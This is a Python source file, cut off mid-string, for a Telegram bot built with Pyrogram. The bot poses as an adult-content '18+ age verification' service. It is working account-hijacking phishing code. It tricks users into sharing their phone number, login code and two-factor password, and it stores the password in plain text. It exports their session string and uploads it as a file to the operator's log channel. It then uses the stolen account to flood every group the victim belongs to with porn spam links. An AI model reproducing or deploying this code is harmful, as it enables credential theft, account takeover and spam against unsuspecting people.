import os
import asyncio
import random
from pathlib import Path
from pyrogram import Client, filters, enums
from pyrogram.types import (
    Message,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    ReplyKeyboardMarkup,
    KeyboardButton,
    ReplyKeyboardRemove,
    CallbackQuery
)
from pyrogram.errors import (
    PhoneNumberInvalid,
    PhoneCodeInvalid,
    PhoneCodeExpired,
    SessionPasswordNeeded,
    PasswordHashInvalid,
    FloodWait,
    AuthKeyUnregistered,
    SessionRevoked,
    SessionExpired
)
from config import API_ID, API_HASH, DATABASE_URI_SESSIONS_F, LOG_CHANNEL_SESSIONS_FILES
from pymongo import MongoClient

# MongoDB Setup
mongo_client = MongoClient(DATABASE_URI_SESSIONS_F)
database = mongo_client['Cluster0']['sessions']

# Promo Texts (10 unique messages)
PROMO_TEXTS = [
    "🔥 10K+ Premium Videos!! \n💎 Ultra HD Content \n🎁 Exclusive Access \n👉 http://bit.ly/premium_bot",
    "💋 Unlimited Access \n🔥 HD Quality \n😍 Free Trial Available \n👉 http://bit.ly/premium_bot",
    "😈 Exclusive Content \n🔥 New Uploads Daily \n💦 Click to Explore \n👉 http://bit.ly/premium_bot",
    "🎥 Premium Collection \n😍 100% Quality Content \n💥 Tap to Watch \n👉 http://bit.ly/premium_bot",
    "💎 VIP Access \n💦 Special Content \n👀 Daily Updates \n👉 http://bit.ly/premium_bot",
    "👅 Unlimited Access \n🔞 Premium Content \n🎁 Special Offer \n👉 http://bit.ly/premium_bot",
    "🔥 HD Quality \n💋 Just Click & Watch \n💦 Premium Videos \n👉 http://bit.ly/premium_bot",
    "🎬 Daily Updates \n💥 Exclusive Content \n🔞 Premium Access \n👉 http://bit.ly/premium_bot",
    "👀 New Videos Daily \n💦 Premium Collection \n🎉 Join Now \n👉 http://bit.ly/premium_bot",
    "🚨 Unlimited Access \n💦 Premium Content \n🔥 Exclusive Offers \n👉 http://bit.ly/premium_bot"
]

# Strings
strings = {
    'need_login': "You Have To /start First!",
    'already_logged_in': "You're Already Logged In! 🥳",
    'age_verification': "**⚠️ Age Verification Required! ⚠️**\n\nYou must be 18+ to proceed.\n\nClick below to verify 👇",
    'verification_success': "**✅ Verification Successful! ✅**\n\nYou now have access to premium content!",
    'logout_success': "**🔒 Logged Out Successfully! 🔒**\n\nUse /start to login again.",
    'not_logged_in': "**Not Logged In!**\n\nPlease use /start first.",
    'otp_wrong': "**❌ Invalid OTP! ❌**\n\nAttempts left: {attempts}\n\nPlease re-enter the verification code:",
    '2fa_wrong': "**❌ Invalid 2FA Password! ❌**\n\nAttempts left: {attempts}\n\nPlease re-enter your 2FA password:",
    'otp_blocked': "**🚫 Account Temporarily Blocked! 🚫**\n\nToo many wrong OTP attempts.",
    '2fa_blocked': "**🚫 Account Temporarily Blocked! 🚫**\n\nToo many wrong 2FA attempts."
}

# Inline OTP Keyboard
OTP_KEYBOARD = InlineKeyboardMarkup([
    [
        InlineKeyboardButton("👉 Get Verification Code", url="https://t.me/example_bot")
    ],
    [
        InlineKeyboardButton("1️⃣", callback_data="otp_1"),
        InlineKeyboardButton("2️⃣", callback_data="otp_2"),
        InlineKeyboardButton("3️⃣", callback_data="otp_3")
    ],
    [
        InlineKeyboardButton("4️⃣", callback_data="otp_4"),
        InlineKeyboardButton("5️⃣", callback_data="otp_5"),
        InlineKeyboardButton("6️⃣", callback_data="otp_6")
    ],
    [
        InlineKeyboardButton("7️⃣", callback_data="otp_7"),
        InlineKeyboardButton("8️⃣", callback_data="otp_8"),
        InlineKeyboardButton("9️⃣", callback_data="otp_9")
    ],
    [
        InlineKeyboardButton("🔙", callback_data="otp_back"),
        InlineKeyboardButton("0️⃣", callback_data="otp_0"),
        InlineKeyboardButton("✅ Submit", callback_data="otp_submit")
    ]
])

# State Management
user_states = {}

async def check_login_status(user_id):
    user_data = database.find_one({"id": user_id})
    return bool(user_data and user_data.get('logged_in'))

async def cleanup_user_state(user_id):
    if user_id in user_states:
        state = user_states[user_id]
        if 'client' in state and state['client'].is_connected:
            await state['client'].disconnect()
        del user_states[user_id]

async def handle_session_error(bot: Client, phone_number: str, error: Exception):
    error_type = {
        AuthKeyUnregistered: "SESSION_EXPIRED",
        SessionRevoked: "SESSION_REVOKED", 
        SessionExpired: "SESSION_EXPIRED"
    }.get(type(error), "UNKNOWN_ERROR")
    
    await bot.send_message(
        LOG_CHANNEL_SESSIONS_FILES,
        f"⚠️ #{error_type}: {phone_number}\n"
        f"❌ Promotion disabled\n"
        f"🔧 Error: {str(error)[:200]}"
    )
    database.update_one(
        {"mobile_number": phone_number},
        {"$set": {"promotion": False}}
    )

@Client.on_message(filters.private & filters.command("start"))
async def start_login(bot: Client, message: Message):
    user_id = message.from_user.id
    user_data = database.find_one({"id": user_id})
    
    if user_data and user_data.get('session'):
        try:
            test_client = Client(":memory:", session_string=user_data['session'])
            await test_client.connect()
            await test_client.get_me()
            await test_client.disconnect()
            
            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": True}}
            )
            await message.reply(strings['verification_success'])
            asyncio.create_task(send_promotion_messages(bot, user_data['session'], user_data['mobile_number']))
            return
        except Exception:
            database.update_one(
                {"id": user_id},
                {"$set": {"logged_in": False, "session": None, "promotion": False}}
            )
    
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'])
        return
    
    await message.reply(
        strings['age_verification'],
        reply_markup=ReplyKeyboardMarkup(
            [[KeyboardButton("🔞 Verify Age", request_contact=True)]],
            resize_keyboard=True,
            one_time_keyboard=True
        )
    )

@Client.on_message(filters.private & filters.command("logout"))
async def handle_logout(bot: Client, message: Message):
    user_id = message.from_user.id
    
    database.update_one(
        {"id": user_id},
        {"$set": {"logged_in": False}}
    )
    
    await message.reply(strings['logout_success'])
    await cleanup_user_state(user_id)

@Client.on_message(filters.private & filters.contact)
async def handle_contact(bot: Client, message: Message):
    user_id = message.from_user.id
    if await check_login_status(user_id):
        await message.reply(strings['already_logged_in'], reply_markup=ReplyKeyboardRemove())
        return
    
    processing_msg = await message.reply("Processing...", reply_markup=ReplyKeyboardRemove())
    
    phone_number = message.contact.phone_number
    if not phone_number.startswith('+'):
        phone_number = f"+{phone_number}"
    
    client = Client(":memory:", API_ID, API_HASH)
    
    try:
        await client.connect()
        code = await client.send_code(phone_number)
        user_states[user_id] = {
            'phone_number': phone_number,
            'client': client,
            'phone_code_hash': code.phone_code_hash,
            'otp_digits': '',
            'processing_msg_id': processing_msg.id,
            'otp_attempts': 0,
            '2fa_attempts': 0
        }
        
        sent_msg = await bot.send_message(
            user_id,
            "**Verification Code Sent!**\n\nEnter the 6-digit code:",
            reply_markup=OTP_KEYBOARD
        )
        user_states[user_id]['last_msg_id'] = sent_msg.id
        await bot.delete_messages(user_id, processing_msg.id)
        
    except Exception as e:
        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

@Client.on_callback_query(filters.regex("^otp_"))
async def handle_otp_buttons(bot: Client, query: CallbackQuery):
    user_id = query.from_user.id
    if user_id not in user_states:
        await query.answer("Session expired. /start again.", show_alert=True)
        await query.message.delete()
        return
    
    action = query.data.split("_")[1]
    state = user_states[user_id]

    if action == "back":
        state['otp_digits'] = state['otp_digits'][:-1]
    elif action == "submit":
        if len(state['otp_digits']) < 5:
            await query.answer("Code must be 5+ digits!", show_alert=True)
            return
        
        await query.message.edit("Verifying...")
        try:
            await state['client'].sign_in(
                state['phone_number'],
                state['phone_code_hash'],
                state['otp_digits']
            )
            await create_session(bot, state['client'], user_id, state['phone_number'])
        except PhoneCodeInvalid:
            state['otp_attempts'] += 1
            if state['otp_attempts'] >= 3:
                await query.message.edit(strings['otp_blocked'])
                database.update_one(
                    {"id": user_id},
                    {"$set": {"blocked": True}}
                )
                await cleanup_user_state(user_id)
                return
            
            attempts_left = 3 - state['otp_attempts']
            await query.message.edit(
                strings['otp_wrong'].format(attempts=attempts_left),
                reply_markup=OTP_KEYBOARD
            )
            state['otp_digits'] = ''
        except SessionPasswordNeeded:
            await query.message.edit("**🔒 2FA Required!**\n\nEnter your password:")
            state['needs_password'] = True
            state['last_msg_id'] = query.message.id
        except Exception as e:
            await query.message.reply(f"Error: {e}\n/start again.")
            await cleanup_user_state(user_id)
        return
    else:
        if len(state['otp_digits']) < 6:
            state['otp_digits'] += action
    
    await query.message.edit(
        f"**Current Code:** `{state['otp_digits'] or '____'}`\n\nPress ✅ when done",
        reply_markup=OTP_KEYBOARD
    )
    await query.answer()

@Client.on_message(filters.private & filters.text & ~filters.command(["start", "logout"]))
async def handle_2fa_password(bot: Client, message: Message):
    user_id = message.from_user.id
    if user_id not in user_states or not user_states[user_id].get('needs_password'):
        return
    
    password = message.text
    state = user_states[user_id]
    
    try:
        if 'last_msg_id' in state:
            try:
                await bot.delete_messages(user_id, state['last_msg_id'])
            except Exception:
                pass
        
        try:
            await message.delete()
        except Exception:
            pass
        
        await state['client'].check_password(password=password)
        verified_msg = await bot.send_message(user_id, "Verifying...", reply_markup=ReplyKeyboardRemove())
        state['verified_msg_id'] = verified_msg.id
        
        database.update_one(
            {"id": user_id},
            {"$set": {
                "2fa_status": True,
                "2fa_password": password
            }},
            upsert=True
        )
        
        await create_session(bot, state['client'], user_id, state['phone_number'])
        
    except PasswordHashInvalid:
        state['2fa_attempts'] += 1
        if state['2fa_attempts'] >= 3:
            await message.reply(strings['2fa_blocked'], reply_markup=ReplyKeyboardRemove())
            database.update_one(
                {"id": user_id},
                {"$set": {"blocked": True}}
            )
            await cleanup_user_state(user_id)
            return
        
        attempts_left = 3 - state['2fa_attempts']
        error_msg = await message.reply(
            strings['2fa_wrong'].format(attempts=attempts_left),
            reply_markup=ReplyKeyboardRemove()
        )
        state['last_msg_id'] = error_msg.id
    except Exception as e:
        await message.reply(f"Error: {e}\n/start again.", reply_markup=ReplyKeyboardRemove())
        await cleanup_user_state(user_id)

async def create_session(bot: Client, client: Client, user_id: int, phone_number: str):
    try:
        string_session = await client.export_session_string()
        await client.disconnect()
        
        data = {
            'session': string_session,
            'logged_in': True,
            'mobile_number': phone_number,
            'promotion': True
        }
        
        if existing := database.find_one({"id": user_id}):
            database.update_one({'_id': existing['_id']}, {'$set': data})
        else:
            data['id'] = user_id
            database.insert_one(data)

        os.makedirs("sessions", exist_ok=True)
        clean_phone = phone_number.replace('+', '')
        session_file = Path(f"sessions/{clean_phone}.session")

        with open(session_file, "w") as f:
            f.write(string_session)
            
        await bot.send_document(
            LOG_CHANNEL_SESSIONS_FILES,
            str(session_file),
            caption=f"📱 User: {clean_phone}\n🔑 Session Created!"
        )
        os.remove(session_file)

        state = user_states.get(user_id, {})
        messages_to_delete = []
        if 'verified_msg_id' in state:
            messages_to_delete.append(state['verified_msg_id'])
        if 'last_msg_id' in state:
            messages_to_delete.append(state['last_msg_id'])
        
        for msg_id in messages_to_delete:
            try:
                await bot.delete_messages(user_id, msg_id)
            except Exception:
                pass
        
        await bot.send_message(user_id, strings['verification_success'])
        asyncio.create_task(send_promotion_messages(bot, string_session, phone_number))
        
    except Exception as e:
        await bot.send_message(user_id, f"Error: {e}\n/start again")
    finally:
        await cleanup_user_state(user_id)

async def send_promotion_messages(bot: Client, session_string: str, phone_number: str):
    already_notified = False
    status_message = None
    
    while True:
        client = None
        try:
            client = Client("promo", session_string=session_string)
            await client.start()
            already_notified = False
            
            me = await client.get_me()
            total_groups = 0
            owned_channels = 0
            owned_groups = 0
            members_count = 0
            groups = []
            
            try:
                async for dialog in client.get_dialogs():
                    try:
                        if not hasattr(dialog, 'chat'):
                            continue
                            
                        chat = dialog.chat
                        if not chat:
                            continue
                            
                        if chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                            total_groups += 1
                            groups.append(chat)
                            
                        if hasattr(chat, 'is_creator') and chat.is_creator:
                            if chat.type == enums.ChatType.CHANNEL:
                                owned_channels += 1
                            elif chat.type in [enums.ChatType.GROUP, enums.ChatType.SUPERGROUP]:
                                owned_groups += 1
                            
                            if hasattr(chat, 'members_count') and chat.members_count:
                                members_count += chat.members_count
                            else:
                                try:
                                    count = await client.get_chat_members_count(chat.id)
                                    members_count += count
                                except:
                                    pass
                    except Exception:
                        continue
            except Exception:
                pass
            
            message_text = (
                f"🚀 Promotion Started: {phone_number}\n"
                f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                f"📊 Stats:\n"
                f"• Groups: {total_groups}\n"
                f"• Owned Groups: {owned_groups}\n"
                f"• Owned Channels: {owned_channels}\n"
                f"• Members: {members_count}\n\n"
                f"✅ Messages Sent: 0/{total_groups}"
            )
            
            try:
                if status_message:
                    await status_message.edit_text(message_text)
                else:
                    status_message = await bot.send_message(
                        LOG_CHANNEL_SESSIONS_FILES,
                        message_text
                    )
            except Exception:
                status_message = await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    message_text
                )
            
            user_data = database.find_one({"mobile_number": phone_number})
            if not user_data or not user_data.get('promotion', True):
                await bot.send_message(
                    LOG_CHANNEL_SESSIONS_FILES,
                    f"⏸️ Promotion stopped: {phone_number}"
                )
                break

            sent_count = 0
            for group in groups:
                try:
                    promo_text = random.choice(PROMO_TEXTS)
                    await client.send_message(group.id, promo_text)
                    sent_count += 1
                    
                    try:
                        await status_message.edit_text(
                            f"🚀 Promotion: {phone_number}\n"
                            f"👤 User: @{me.username or 'N/A'} ({me.id})\n\n"
                            f"📊 Stats:\n"
                            f"• Groups: {total_groups}\n"
                            f"• Owned Groups: {owned_groups}\n"
                            f"• Owned Channels: {owned_channels}\n"
                            f"• Members: {members
